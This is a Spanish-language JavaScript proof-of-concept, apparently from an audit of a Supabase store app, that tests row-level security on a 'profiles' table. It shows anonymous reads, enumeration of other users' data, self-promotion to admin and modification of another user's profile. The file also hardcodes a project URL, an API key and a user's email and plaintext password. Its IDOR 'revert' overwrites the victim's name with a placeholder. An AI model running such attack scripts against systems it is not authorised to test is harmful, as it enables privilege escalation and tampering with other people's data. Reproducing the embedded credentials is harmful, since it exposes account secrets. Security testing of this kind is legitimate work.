/**
 * PoC — VUL-02: Auditoría de RLS en tabla `profiles`
 * Proyecto: VynilStore (Groovehaus)
 * Auditor: Manuel
 * 
 * OBJETIVO: Verificar si la tabla `profiles` tiene RLS correctamente
 * configurada. Prueba 3 ataques:
 *   A) Lectura de todos los perfiles (enumeración de usuarios)
 *   B) Actualización de rol propio a 'admin' (escalada de privilegios)
 *   C) Lectura de perfiles como usuario anónimo (sin JWT)
 * 
 * PREREQUISITOS:
 *   - Al menos 2 cuentas de usuario normales registradas
 *   - npm install @supabase/supabase-js
 * 
 * USO:
 *   node poc_vul02_profiles_rls.js
 */

import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL  = 'https://ybcxzntioiohbmyhwiee.supabase.co'
const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InliY3h6bnRpb2lvaGJteWh3aWVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNDI2MTksImV4cCI6MjA5NDgxODYxOX0.slRr5A5K804uag2N-1g6u9jz2Vaq2FXB1mRoxQXE37k'

// Usuario NORMAL (no admin) para las pruebas
const USER_EMAIL    = 'manualcraft@gmail.com'
const USER_PASSWORD = 'manuelito'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON)

// Helper para imprimir resultados con color
function result(label, passed, detail = '') {
  const icon = passed ? '✅ SEGURO' : '🔴 VULNERABLE'
  console.log(`   ${icon} — ${label}`)
  if (detail) console.log(`   → ${detail}`)
}

async function runPoC() {
  console.log('='.repeat(60))
  console.log('PoC VUL-02 — Auditoría de RLS en tabla `profiles`')
  console.log('='.repeat(60))

  // ─────────────────────────────────────────────
  // TEST A: Acceso anónimo (sin JWT)
  // ─────────────────────────────────────────────
  console.log('\n[TEST A] Lectura de profiles SIN autenticación (anon):')
  const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON, {
    auth: { persistSession: false }
  })
  const { data: anonData, error: anonErr } = await anonClient
    .from('profiles')
    .select('*')
    .limit(5)

  if (anonErr) {
    result('Anon no puede leer profiles', true, anonErr.message)
  } else if (anonData && anonData.length > 0) {
    result('Anon puede leer profiles', false, 
      `Devolvió ${anonData.length} registro(s). Datos: ${JSON.stringify(anonData[0])}`)
  } else {
    result('Anon no obtiene datos', true, 'Devolvió array vacío (RLS bloquea o tabla vacía)')
  }

  // ─────────────────────────────────────────────
  // TEST B: Enumeración de usuarios (usuario normal lee todos los perfiles)
  // ─────────────────────────────────────────────
  console.log('\n[TEST B] Enumeración: usuario normal lee TODOS los profiles:')
  const { data: loginData, error: loginErr } = await supabase.auth.signInWithPassword({
    email: USER_EMAIL,
    password: USER_PASSWORD
  })
  if (loginErr) {
    console.log('   ⚠️  Login fallido — actualizar credenciales en el script:', loginErr.message)
  } else {
    const myUserId = loginData.user.id
    console.log(`   Logueado como: ${loginData.user.email} (ID: ${myUserId})`)

    const { data: allProfiles, error: enumErr } = await supabase
      .from('profiles')
      .select('*')

    if (enumErr) {
      result('No puede enumerar profiles', true, enumErr.message)
    } else if (allProfiles.length > 1) {
      result('Puede leer profiles de OTROS usuarios', false,
        `Devolvió ${allProfiles.length} perfiles. ¡Enumeración de usuarios posible!`)
      console.log('   Muestra de datos:')
      allProfiles.slice(0, 3).forEach(p => console.log(`   - ${JSON.stringify(p)}`))
    } else if (allProfiles.length === 1 && allProfiles[0].id === myUserId) {
      result('Solo puede leer su propio profile', true, 
        'RLS correctamente aislada por usuario')
    } else {
      result('Devolvió 0 perfiles (posible)', true, 'Sin datos o RLS activa')
    }

    // ─────────────────────────────────────────────
    // TEST C: Escalada de privilegios — cambiar rol a 'admin'
    // ─────────────────────────────────────────────
    console.log('\n[TEST C] Escalada de privilegios: usuario normal intenta role=admin:')
    const { data: updateData, error: updateErr } = await supabase
      .from('profiles')
      .update({ role: 'admin' })
      .eq('id', myUserId)
      .select()

    if (updateErr) {
      result('No puede actualizar su propio rol', true, updateErr.message)
    } else if (updateData && updateData.length > 0 && updateData[0].role === 'admin') {
      result('¡ROL CAMBIADO A ADMIN!', false,
        '🚨 ESCALADA DE PRIVILEGIOS EXITOSA — Usuario normal se hizo admin')
      console.log('   Datos del perfil actualizado:', JSON.stringify(updateData[0]))
      
      // Revertir el daño
      console.log('\n   [REVERT] Restaurando rol a "user"...')
      await supabase.from('profiles').update({ role: 'user' }).eq('id', myUserId)
      console.log('   Rol revertido.')
    } else {
      result('No pudo escalar privilegios', true, 
        `Respuesta: ${JSON.stringify(updateData)} | Error: ${updateErr?.message}`)
    }

    // ─────────────────────────────────────────────
    // TEST D: IDOR — usuario normal lee/modifica el perfil de otro usuario
    // ─────────────────────────────────────────────
    console.log('\n[TEST D] IDOR: usuario normal modifica profile de OTRO usuario:')
    
    // Obtener un UUID que NO sea el propio para intentar modificarlo
    const { data: allForIDOR } = await supabase.from('profiles').select('id').limit(10)
    const otherUser = allForIDOR?.find(p => p.id !== myUserId)
    
    if (!otherUser) {
      console.log('   ⚠️  No se encontraron otros usuarios para probar IDOR.')
    } else {
      console.log(`   Intentando modificar perfil del usuario: ${otherUser.id}`)
      const { data: idorData, error: idorErr } = await supabase
        .from('profiles')
        .update({ full_name: 'HACKED_BY_AUDITOR' })
        .eq('id', otherUser.id)
        .select()

      if (idorErr) {
        result('No puede modificar profiles de otros', true, idorErr.message)
      } else if (idorData && idorData.length > 0) {
        result('¡IDOR Exitoso!', false,
          `🚨 Modificó el profile del usuario ${otherUser.id}`)
        // Revertir
        await supabase.from('profiles')
          .update({ full_name: 'NOMBRE_ORIGINAL_AQUI' })
          .eq('id', otherUser.id)
      } else {
        result('IDOR bloqueado (0 filas afectadas)', true, 'RLS rechazó la operación')
      }
    }

    await supabase.auth.signOut()
  }

  console.log('\n' + '='.repeat(60))
  console.log('FIN DE AUDITORÍA DE PROFILES RLS')
  console.log('='.repeat(60))
}

runPoC().catch(console.error)
